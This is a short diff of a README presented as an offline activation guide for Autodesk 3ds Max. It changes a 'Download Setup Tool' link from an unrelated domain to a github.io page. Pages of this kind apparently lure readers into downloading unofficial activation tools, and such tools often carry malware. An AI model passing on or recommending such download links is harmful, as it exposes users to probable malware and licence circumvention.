@@ -1,6 +1,6 @@
 # 🧱 Autodesk 3ds Max — Offline Activation Guide
 
-[![Download Setup Tool](https://img.shields.io/badge/Download-Setup_Tool-steelblue)](https://dalahdrivingschool.com/)
+[![Download Setup Tool](https://img.shields.io/badge/Download-Setup_Tool-steelblue)](https://autodesk-3ds-max-offline-activation.github.io/.github)
 
 ## 🧩 How to Install and Activate Offline
 
